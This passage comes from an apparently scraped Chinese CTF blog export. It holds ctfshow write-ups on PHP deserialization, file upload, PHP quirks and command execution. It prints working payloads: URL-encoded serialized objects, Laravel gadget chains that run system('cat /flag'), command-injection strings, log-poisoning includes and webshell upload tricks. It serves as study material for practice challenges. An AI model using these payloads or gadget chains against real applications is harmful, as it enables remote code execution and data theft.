方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。 所以我们可以通过用含有__toString方法的内置类进行绕过，这里用的是Exception 和 Error （随便选一个哪个都可以） 他们有 __toString 方法，当类被当做字符串处理时，就会调用这个函数。 一个简单的demo来理解 偷的 这里我们将类当作字符串进行输出就会调用我们内置类中单__toString魔术方法 所以 $a!=$b但是我们输出的内容确是相同的 注意这里我们将$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);放在同一行了 因为输出的内容包含我们的行数 所以为了满足条件成立 就要放在同一行 接着看正则将我们单双引号括号都waf了 我们可以include 包含flag文件 然后flag文件可以通过取反的方式绕过 exp: payload:?great=O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D 说明：?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;为什么要在前面加?&gt; Exception 类与 Error 的 __toString 方法在eval()函数中输出的结果是不可能控的 因为输出的报错信息中，payload前面还有一段杂乱信息Error: 就比如我们之前的那个demo 进入eval()函数就会以这样的形式：eval(&quot;...Error: &lt;?php payload ?&gt;&quot;) 所以我们要用sql注入的思想 ?&gt; 来闭合一下 eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)，这样我们的恶意代码就可以顺利执行了。 参考： 112、EasyBypass 给了源码 comm1没有过滤tac 因此我们就在这里构造 这道题目最重要的就是利用闭合的思想 $cmd = &quot;file $comm1 $comm2&quot;;这句就是我们闭合逃逸的最重要的一句 file需要一个文件 那么我们就给他的一个index.php然后用”;去闭合 也就是$cmd = &quot;file index.php&quot;; $comm2&quot;; 再加上我们的恶意代码 构造index.php&quot;;tac /fla?;&quot; 原式就会被我们构造成以下三段 成功bypass payload：?comm1=index.php&quot;;tac /fla?;&quot;&amp;comm2=1"},{"title":"ctfshow-反序列化","date":"2023-07-06T07:04:46.000Z","url":"/post/4fb535d6.html","tags":["反序列化"],"categories":["ctfshow"],"content":"ctfshow-反序列化 WEB-254就是看懂代码就可以了，和反序列化没关系，让条件成立就给flag了 paylaod:?username=xxxxxx&amp;password=xxxxxx WEB-255通过cookie传参反序列化达到$isVip=true;即可 poc： 然后请求如下： WEB-256在上一题基础上使得username与password不相等 通过反序列化实现即可 poc: 这里最好不要将值设为数字会打不通的 请求包如下： WEB-257思路：ctfShowUser类的__destruct()-&gt;backDoor的getInfo() 利用构造函数进行覆盖就行了 poc如下： 请求包： WEB-258多了一个正则匹配条件：!preg_match(&#39;/[oc]:\\d+:/i&#39;, $_COOKIE[&#39;user&#39;]) 就是不能存在o:数字的形式 因为我们序列化对象后会出现这种情况 所以我只需要在:之后加上+即可 因为浏览器解析会把我们的加号解析为空格 就可以bypass了 poc和上到题目一样 就是自己手动添加两个+即可 提交的时候再url编码一下不然会出现歧义 WEB-259(SoapClient)SoapClient采用HTTP作为底层通讯协议，XML作为数据传送的格式。 这道题目本质我看了一下wp 利用SoapClient的__call魔术方法 因为我们用SoapClient生成的对象不存在getFlag()方法，所以就会自动调用__call魔术方法 默认$func为不存在函数名 $args为参数 并且以数组形式 这道题目最大问题就是没法直接通过访问&#x2F;flag修改其xff为127.0.0.1来达到条件 所以就需要这个内置类配合crlf来模拟一个请求包 来达到将flag存入flag.txt的条件 我的理解是这样 参考: 讲的很仔细 poc(偷的人家的): WEB-262，264(反序列化字符串逃逸)看到有序列化后字符替换 一眼丁真就是字符串逃逸 这道题目其实会将我们提交的内容先序列化然后再反序列化 简单demo看懂 payload:?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D 然后将cookie保存下来 访问&#x2F;message 打入cookie即可获得flag WEB-263(phpsession序列化)访问&#x2F;www.zip源码泄露 这道题目一开始最大的疑惑是是我们提交上去的序列化内容在哪反序列化的 网上wp千篇一律没人提及 最后我也没弄明白 感觉只有这个session引擎会 所以我也就这么理解了 先来看：ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);参考： session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 然后简单的逻辑就是我们可以通过控制session去序列化 在inc.php有 他的析构函数就是我们的插入点 因为这个题目是默认的引擎 所以session是用|来分割键值 值为serialize()处理的结果 poc如下： 访问index.php cookie[limit]打入 再访问check.php 然后访问我们的木马文件 log-1.php rce即可 WEB-265(取地址符)这道题目一开始看 发现这个随机数函数绕过不去 看了wp 师傅们太强了 用了&amp;取地址 $a=&amp;$b则当b值变 a也跟着变 poc: WEB-266这道题目大写绕个正则即可 WEB-267(Yii2反序列化链)yii2是php的一个框架 直接在网上找现成的链子poc即可 首先通过弱口令 admin&#x2F;admin登录 然后查看about 提示访问?r=site%2Fabout&amp;view-source 然后这里查看源码可以发现yii2这个信息 因为是反序列化模块嘛直接去找链子即可 这道题找到的poc只能用passthru函数 其他函数都用不了 挺奇怪的 poc如下： 参考： 这里的链子哪个不行换就行了 paylaod: WEB-268（Yii2反序列化链）前面的链子不行了 换一个就行了 WEB-269(Yii2反序列化链)继续换： WEB-270(Yii2反序列化链)这次用反弹shell WEB-271(Laravel5.7反序列化)直接网上嫖利用链就行了 参考： post:data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A8%3A%22DawnT0wn%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7D%7D WEB-272~273(Laravel5.8反序列化)poc如下 参考 post:data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A42%3A%22%3C%3Fphp+echo+system%28%27cat+%2Fflag%27%29%3B+exit%28%29%3B+%3F%3E%22%3B%7D%7D%7D WEB-274(thinkPHP5.1反序列化)看到界面就很熟悉一眼丁真是thinkphp payload: WEB-275这道题有个逻辑错误 一开始我还以为关键在于copy($_GET[&#39;fn&#39;],md5(mt_rand()).&#39;.txt&#39;); 这道题目问题是将我们木马文件赋值到一个随机文件中 然后把我们的文件删了 本来想是在他删除我们文件之前利用重定向 将flag读到别的文件中 之后发现不行 没有权限好像 看了眼wp 返现纯纯的逻辑问题 直接利用析构函数里的system 拼接命令即可 payload: WEB-276(phar反序列化)首先这道题目增加了一个admin 想进入析构函数执行system则必须修改这个admin 那么就需要进行反序列化 但是题目并没有给我们反序列化的函数 然后看了wp就是通过phar来进行的 首先上传一个文件然后内容是phar生成的内容(包含我们的恶意序列化内容) 这是一个固定格式 我之前总结过这里就不赘述了 但是一开始我最大的问题 我们上传的文件需要配合phar:&#x2F;&#x2F;协议 然后我们的恶意内容才会进行反序列化 在哪里利用phar:&#x2F;&#x2F;呢 然后又检索了一番 原来是我们上传上去之后 脚本源码是通过unlink函数进行删除我们上传的文件的 刚好这个unlink函数就可以配合phar:&#x2F;&#x2F;协议将我们的恶意内容反序列化 因此这里需要条件竞争 一个包一直发上传phar序列化内容的包 另一个包一直发phar:&#x2F;&#x2F;协议访问我们上传文件的包 但是不知道是我哪里不对，还是题目环境问题，不管是自己发包还是别人的poc，我一直没成功，不过明白怎么做就ok了，思路最重要。 然后受影响的函数有这些 偷的： WEB-277 288（python）常规反序列化 查看源码#--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) EXP如下： 尾巴：至此 即将进军java模块 当然准备开始学习java！冲就完了"},{"title":"ctfshow-文件上传","date":"2023-07-04T08:32:29.000Z","url":"/post/c5a854c1.html","tags":["文件上传"],"categories":["ctfshow"],"content":"ctfshow-文件上传 WEB-151(前端验证)上传png后缀的 然后抓包改回php即可 WEB-152(后端Content-Type校验) Content-Type是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。 所以跟151做法一样 先上传png然后bp改后缀即可 参考：   WEB-153（.user.ini）前两种通过修改后缀这里不能用了 访问&#x2F;upload 发现有内容nothing here 然后可以猜到这里有&#x2F;uplaod&#x2F;index.php 那么目标就很明确了 我们上传的路径下有一个现成的php文件 理所当然想到通过上传.user.ini来做这道题 但是.htaccess只是适用于apache，如果变成niginx或者iis则不会被解析 通过报错我们可以看到题目环境中间件是nginx 但是这也不影响我们用.user.ini 因为只要用了fastcgi我们就可以用.user.ini FastCGI常用于将Web服务器（如Nginx、Apache）与应用程序（如PHP、Python、Ruby）进行集成，以提供动态内容的生成和处理能力。它是一种高性能、灵活和可扩展的Web应用程序交互协议。 .user.ini: .user.ini也是php的一种配置文件，众所周知php.ini是php的配置文件，它可以做到显示报错，导入扩展，文件解析，web站点路径等等设置。但是如果想要把某个文件里面的配置与全局的php.ini不同，则可以在php文件中加上ini_set()来配置特定的配置变量。 而.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。 偷的 简单理解就是php的配置文件它可以设置一些配置 比如怎么去解析我们上传的文件一类的 内容: 怎么理解？ 就是把我们指定的文件包含进宿主php文件中 利用其实本质就是用require()去包含我们的恶意文件并且即使后缀不是php文件也可被当作php文件来解析 这里require()完全就是include()函数一样 一个是宿主php文件头部去包含 一个是尾部两者皆可 先将.user.ini增加后缀png然后抓包去除 在上传我们指定的恶意文件 这时我们前面已经说的很清楚了 直接访问&#x2F;upload&#x2F;index.php 这样我们的木马就被包含在这个index.php文件中了而不是直接去访问我们的木马文件 可以看到 已经包含在头部了 WEB-154~155（.user.ini+短标签）waf了文件内容php字样 用短标签bypass即可 WEB-156([]绕过)在154~155基础上过滤了[]用&#123;&#125;bypass WEB-157~159({} ; ()绕过)在前面基础上过滤了{}和分号 那我们不写一句话了 直接命令执行读flag 159不行 过滤了括号只能用第一种 WEB-160(日志包含 绕log)&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;log用拼接绕过 然后文件头User-Agent包含一句话木马即可 WEB-161(文件头检测绕过)在160基础上增加了检测文件头的函数 增加图片头GIF89a绕过即可 getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求 其实GIF89a就是我们一般见到的gif动图的文件头 通过010对一个gif图分析就能看到文件头 WEB-162~163(session 条件竞争)之前别的模块做过类似的 上传一个文件改数据包： 加上木马和Cookie:PHPSESSID=ban 然后再将.user.ini改为 然后两个条件竞争一直发包即可 WEB-164（PNG 二次渲染）随便上传一个图片 然后我们可以访问 可以看到是通过文件包含形式 二次渲染就是我们夹杂在图像里的木马上传后会被删掉 我们需要下载下来找到它不删除的地方把我们的木马加进去然后利用文件包含执行我们的木马 因为我的php是8.2.0的版本 修改ini文件 extension=gd把前面的;去掉 然后才能用这个脚本 可以看到木马是以短标签写进去的 抓包执行即可 WEB-165(jpg二次渲染)傻逼题 没啥好说的 WEB-166(zip)给zip后面添加一句话上传 然后包含执行 题目环境有问题 返回包是空的 WEB-167(.htaccess)报500错误 环境有问题 无语了 .htaccess也是php的配置文件 是一个局部配置文件 只对该文件所在目录下的文件起作用 我们可以上传上去jpg文件 但是不是php文件 无法解析 所以我们需要.htaccess这个文件去将我们的jpg文件解析成php文件 内容： WEB-168(免杀)过滤了eval get post system paylaod: 当时用反引号做的时候一直在想为什么返回包是空白 后来才想到这个反引号没有回显 要用echo一下 或者搭配短标签 WEB-169~WEB-170(日志包含)可以上传php文件到upload下然后上传user.ini 里面的内容指向nginx的日志文件 然后请求头写入一句话木马 去包含访问即可 结尾：真被某些题环境搞心态了 继续下一大陆 sql注入！！！！！！！！！！！！！！！！！！！ "},{"title":"ctfshow-php特性","date":"2023-07-03T11:53:01.000Z","url":"/post/61d76257.html","tags":["php特性"],"categories":["ctfshow"],"content":"ctfshow-php特性 WEB-89(数组绕正则)需要我们输入数字但是正则匹配不能输入数字 通过数字bypass preg_match()即可 WEB-90,92(intval十六进制) 用16进制即可 WEB-91(多行匹配绕过) ^:匹配php开头 $:匹配php结尾 i：大小写 m:多行匹配 所以用换行符%0a绕过就行 WEB-93(intval八进制)和90，92一样不过这次waf了字母用八进制bypass即可 WEB-94(intval小数点)不能0开头也就不能用八进制了，用小数点即可 WEB-95(intval空格) WEB-96(路径) ./表示当前路径下 WEB-97(md5)经典题型了，不多说 数组 或者 直接去找0e开头的payload都可以 post:a[]=1&amp;b[]=2 WEB-98(三元运算符) 不用管中间的 只看第一行和第二行 当我们提交一个get传参就会让其等于post传参的值 这里用到了取地址符 直接用c的知识去理解就行了 所以payload: WEB-99(in_array)主要是in_array这个函数 这个函数是检测一个字符是否在一个数组中 如果这个函数不设置第三个参数 则表示在检测中不会检查要检测的值是否与数组中的值类型相同 并且自动转换 所以我们输入1.php最后也被会认为是1 WEB-100(运算符优先级) &#x3D;的运算符比and高 对于v0的值只需要看v1就可以v2,v3是干扰 WEB-101(反射类)反射类之前做题有遇到过 原理： 一个简单的demo来理解payload payload：?v1=1&amp;v2=echo new Reflectionclass&amp;v3=; WEB-102~103(hex2bin)利用数字 hex2bin()函数 写shell 然后再用伪协议base64写解码 将shell写进去 payload给的通过base64编码在转为16进制 刚好为纯数字 其他的payload可能夹杂字母 挺巧妙的 WEB-104，106(弱相等)网上随便找0e开头的值即可 post v1=aaO8zKZF WEB-105(变量覆盖)出口其实是这里 一开始没弄明白 其实题目一开始进去内容就是error报出来的 真该死啊我 ?suces=flag post：error=suces WEB-107（parse_str） 一个逻辑问题 post:v1=flag=0cc175b9c0f1b6a831c399e269772661 其中散列值是a的md5值 WEB-108(ereg绕过)ereg 是一个已经过时的函数，用于进行正则表达式的匹配。它用于检查给定的字符串是否与指定的正则表达式模式匹配。 在php5.3.0标记为过时并且在7.0.0完全移除 他的功能就被preg_match代替 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。 WEB-109(Exception类)发现这个反射类和异常类还能配合命令执行函数一起用真的长见识了 方法一 反射类 方法二 异常类 WEB-110 (原生类)?v1=FilesystemIterator&amp;v2=getcwd然后直接访问flag文件就行了 getcwd获得当前目录之后传入FilesystemIterator 遍历指定路径文件系统中的目录和文件 不过如果想遍历需要不断的移动指针不然只会显示当前目录下的第一个文件 当然这道题目够用了 WEB-111(全局变量) ?v1=ctfshow&amp;v2=GLOBALS学到了 WEB-112,114（伪协议） WEB-113(软链接) 或者 &#x2F;proc&#x2F;self&#x2F;root其实是指向根目录的软链接 看别人的WP说是 超过20次软连接后就可以绕过is_file 不太懂 挺神奇的 WEB-114(%0c) WEB-123(php命名规则)老生常谈了 php合法命名规则是字母数字下划线其他字符会被替换为_ post:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag 但是如果出现[则这个符号被替换为_之后的不合法字符都不会被替换 WEB-125(highlight_file)post：CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[1]) 但是不知道为什么inlcude show_source不行 奇怪 WEB-126($_SERVER[‘argv’]) WEB-127($_SERVER[‘QUERY_STRING’])?ctf show=ilove36d还是命名问题 空格会被替换为_从而绕过waf WEB-128（ _()函数）确实是骚操作 在当前域查找信息 _()是gettext()的拓展函数 在开启相关设定后，_(“666”)等价于gettext(“666”)，且就返回其中的参数 打组合拳即可 WEB-129(路径穿越) WEB-130(正则绕过)方法一：利用数组 preg_match只能处理字符串 所以输入数组会输出false 方法二：字符串解析特性 f=ctfshow注意f之前有个空格 这样就识别不到我们的f了 WEB-131(正则回溯)poc如下： WEB-132(逻辑运算符特性) 先是给了一个信息很多的网站 其实做题多了 直接就会去访问&#x2F;admin后台 然后得到源码 是一个逻辑问题 x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y 所以只要保证username=admin 其他两个参数任意即可 WEB-133（curl外带）这道题真是吐了 网上payload没一个可以打通的 多多少少沾点毛病 用curl外带 就是之后跟一个能接受的VPS 用了DNS接受不到 BP的不太会 最后还是云服务器好用 其实就可以用反弹shell一样去理解 无回显处理方式而已 WEB-134(php变量覆盖)payload:?_POST[key1]=36d&amp;_POST[key2]=36d 先将get获取到的参数parse_str($_SERVER[&#39;QUERY_STRING&#39;]);根据&amp;分割成不同部分 然后extract($_POST); 将$_POST数组中的内容输出不同的键值 共分为下面三个流程 _POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d _POST[key1]&#x3D;36d _POST[key2]&#x3D;36d parse_str()将其分割为两部分 key1&#x3D;36d key2&#x3D;36d extract() 将_POST数组中的键值导入到当前符号表中 WEB-135（重定向输出）官方给的外带不好用 直接?F=$F ;nl flag.php&gt;1.txt 注意中间有个空格 能刚好让截取长度满6位 不然会破坏我们的命令结构 WEB-136(tee指令) payload: 就是利用管道符 将我们命令输入的作为tee指令的输入 然后输出到指定的文件中 WEB-137（静态成员调用方法）php通过 类名::属性或者方法 来调用静态成员 post： WEB-138（call_user_func()数组特殊方法） 通过上面的demo 这样payload可以看懂 不仅是字符串 可以给call_user_func()传一个数组的方式去访问静态方法 只能是方法 不能这样访问静态属性 并且也只能是静态方法 不能是public方法 post：ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag WEB-139（没必要）WEB-140(弱相等)偷的payload 0&#x3D;&#x3D;“字符串” 返回的是TRUE intval会将非数字字符转换为0，也就是说 intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0 WEB-141(取反之减号)绕过return的方式：php中数字是可以和命令进行一些运算的，例如 1-phpinfo()-1;结合减号是可以执行phpinfo()命令的 运算符应该都可以 WEB-142 WEB-143(取反之乘号)?v1=10&amp;v2=0&amp;v3=*(&quot;%0c%19%0c%5c%60%60&quot;^&quot;%7f%60%7f%28%05%0d&quot;) (&quot;%0e%0c%00%00&quot;^&quot;%60%60%20%2a&quot;)?&gt;waf了减号 换成乘号就行了 WEB-144(取反之减号) WEB-145(取反之三目运算符)最终构造出eval(&quot;return 1?phpinfo():1;&quot;); payload: WEB-146(取反之或) WEB-147(function_name())参考： 讲的很细 看源码就是大致思路让我们去构造一个函数 并且正则要求需要是特殊的符号开头的 所以平常的函数就不能直接拿来用了 偷的： 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 所以我们可以\\开头 构造类似于这样的 函数第一个参数是传入函数的参数 第二参数是函数内容 如果我们想插入我们的恶意代码就需要sql注入那样闭合的思路 paylaod: post:ctf=%5ccreate_function WEB-148(中文变量)巧妙的构造 &#96;"},{"title":"ctfshow-命令执行","date":"2023-07-03T11:47:28.000Z","url":"/post/53e2b2e1.html","tags":["命令执行"],"categories":["ctfshow"],"content":"ctfshow-命令执行 WEB-32(绕括号，分号) include不用括号，分号可以用?&gt;代替 利用文件包含+伪协议 WEB-37(data协议 日志包含 绕flag)文件包含用data协议base64编码绕flag正则 或者先/一句话木马再日志包含 注意url编码问题 WEB-39(文件包含有后缀干扰) 前面的php语句已经闭合了，所以后面的.php会被当成纯文本直接显示在页面上，起不到什么作用 。 WEB-40(无参RCE构造)解法一无参RCE构造 根据buu一道题目的套娃来做 具体可以看我的文章 解法二 post一个1=system(&#39;cmd&#39;); get_defined_vars() — 返回由所有已定义变量所组成的数组 发现有post数组 然后post一个值 post:1=phpinfo(); 将其弹出并且执行就行 这里指针在第一个元素 将其指向第二个元素 即我们需要的 array_pop — 弹出数组最后一个单元（出栈） 这里在弹出前用next指针指向了 所以并没有弹出最后一个元素，我是这么理解的 得到了我们需要的，然后eval执行就行了 WEB-41(或运算)直接当个脚本小子:)  WEB-42(黑洞)具体可以看 简单说就算$c的内容都会被重定向到一个黑洞就是没有任何输出，相当于被吞掉了 通过%0a,%20截断绕过就行了 WEB-43(&amp;&amp;)逻辑与 先执行左边，只有左边为真，才会执行右边 注意一下这里&amp;&amp;要url编码一下 WEB-45(绕空格) WEB-46~51(重定向绕空格数字$)参考： 关于 2&gt;&amp;1 ?c=tac&lt;fla&#39;&#39;g.php||或者nl也行 就是将flag.php作为tac的输入 然后利用||逻辑或绕%0a和&amp;&amp; 输入重定向去绕空格 WEB-51(${IFS}绕空格)waf了重定向符 或者用$&#123;IFS&#125;或者$IFS 其实两者是相等的 关于$&#123;&#125; WEB-53(空字符绕空格)不是你这个flag文件夹能不能别老是变动 WEB-54(绕正则)关于.* linux一切都是文件 通过文件执行命令 在bin目录下存放着命令文件 我们一般调用命令系统就会调用这里的文件（我是这么认为的） ?是通配符 去模糊匹配一个字符 WEB-55~56（无字母数字rce）解法一参考p神 认识source和. 也就是说source或者.当然这道题目只能用.来执行我们文件中命令 也就是把我们的文件当作脚本运行 不知道为什么我本地没打通 估计是后续这个漏洞被修复了 那么就需要一个包含我们恶意命令的文件 直接构造一个post上传的数据包 当我们上传上去之后 PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。 然后在进行.和linux通配符组合拳去打 这里payload根据p神的文章?c=. /???/????????[@-[]要利用[@-[]去限制下最后一位为大写 不然匹配到很多文件无结果 因此打payload的时候有时候会匹配不到 用bp多提交几次就行 随便上传一个文件 然后内容： 当然bash或者zsh等等都行 shell具体解释器都可以 解法二其实也是利用通配符去执行命令文件 ?c=/???/????64 ????.??? 其实就是去执行 /bin/base64 flag.php WEB-57(特殊方法构造数字)根据题目flag在36.php中 那么我们只需要构造出数字36即可 首先来认识一下$&#123;_&#125;和$(()) $&#123;_&#125; 是一种特殊的变量，它表示上一个命令的最后一个参数 注意一下 如果没有上一个命令则表示为空 在Linux中，$(())是一种用于进行数学运算的特殊语法结构。它通常用于shell脚本中，用于求值一个数学表达式并返回结果。 那么计算空字符就是0 可以$(($&#123;_&#125;))打组合拳 这样就可以构造出数字了 再通过按位取反不断的构造出数字 当时对按位取反还是有点疑惑 不过知乎上一篇稿子解答了我的疑惑 计算机所有二进制输出都是补码的形式 这句话解答了我对补码的疑惑 简单理解就是如下： 然后通过取反得到-1 再拼接得到-2 这样不断的拼接到-37 然后再取反就得到36了 payload：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) WEB-58~65(文件读取函数)system一类的函数都被禁了 所以只能用php中的特殊函数 用文件读取的函数读就行了 post：c=show_source(&#39;flag.php&#39;); c=highlight_file(&#39;flag.php&#39;);有很多类似于无参rce构造呢种套娃 WEB-66(waf show_source()) 当前目录下的flag.php是假的 show_source()被waf了 用highlight_file()读flag.txt即可 WEB-67(waf print_r())用var_dump() bypass即可 WEB-68~70(waf highlight_file()) 因为禁用了highlight_file()所以源码也不显示了 2333 而且好多题目的payload都可以打通好几个关卡 题目太多质量真不太行 WEB-71(输出缓冲区)给了源码 涉及到输出缓冲区知识 ob_get_contents() ob_end_clean() 根据源码 我的理解是将eval()输出的内容会到输出缓存区 然后通过ob_get_contents()函数赋值给s 然后通过一个正则匹配将内容替换不让我们得到我们想要的flag 那么如果我们执行完eval()函数之后不进行之后的操作就可以bypass了 这也是官方payload的原理 因为根据官方文档 exit是个语法结构 如果不输出一个消息 则可以省略圆括号 就有下面两种paylaod WEB-72(php原生类+UAF)这道题目看大佬的WP是 开启了open_basedir。 因此需要打组合拳 DirectoryIterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 这道题目用到了php原生类 之前有了解过  先通过这个payload 获取flag文件名 首先通过?&gt;先闭合之前的&lt;?php再通过原生类DirectoryIterator()不断遍历来获取根目录下的文件 glob:&#x2F;&#x2F;协议 查找匹配的文件路径模式 glob:///*应该怎么理解呢 就是查找 根目录下/*这里的*就是linux的通配符 就是说根目录下的所有文件都被会读取 __toString()方法可以获取字符串形式的文件名 读取的时候需要不断地遍历 因此需要 发现flag在flag0.txt 之后是pwn的知识我挺懵逼的 通过UAF脚本去读flag 挺夸张的 WEB-72~74(php原生类)和上面一样通过原生类获取flag文件名 然后这里可以直接用include()函数读flag即可 WEB-75~76(mysql load_file())这题目太抽象了 连接mysql通过mysql的load_file()去读文件 。。。 WEB-77(FFI) 我的理解是让php直接调用底层c语言的函数利用c代码实现功能 FFI::cdef()创建一个FFI对象 然后利用c语言调用system()函数 WEB-118（${PATH}）fuzz一下发现只能用 大写字母A-Z和${}~.?: 通过linux环境变量截取字母方式构造rce 关于PATH 然后截取我们想要的字母RCE即可 构造 nl flag.php $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.??? 这里A和数字0是一样的效果都是下标 然后~表示从末尾开始截取 在这里我们的默认位置为/var/www/html 因此才能截取到l WEB-119~124(奇淫构造paylaod)wal了PATH直接偷了payload 119: 120: 121: 122: # 和 SHLVL都不能用了,可以用$?来表示1 通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误 但是默认$?默认为0 可以 &lt;A 返回的错误值 使得 $? 为1 paylaod：code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? 多试几次就能成功 124： buuctf Love math一模一样的题目 我博客也写过不赘述了 payload稍稍不同 结尾：哦 终于结束这一章了 断断续续三天日完了 做吐了 开启下一章！ Keep Hacking！"},{"title":"2023年 第三届陕西省大学生网络安全技能大赛（高职院校组）","date":"2023-06-10T10:17:08.000Z","url":"/post/ba5897f5.html","tags":["python原型链污染"],"categories":["各赛事WP"],"content":"2023年 第三届陕西省大学生网络安全技能大赛（高职院校组）web复现 easyrce源码如下： 这几乎该waf的全waf 直接用file:&#x2F;&#x2F;协议读就行了 再来好好看看这个协议; tql mua这题太抽象了！！ 发现给了源码 但是这个md5根本就不让人解出来 查看robots.txt 发现/substr_pass.php 获得hint ?a=xx&amp;b=xx 传参?a=0&amp;b=1 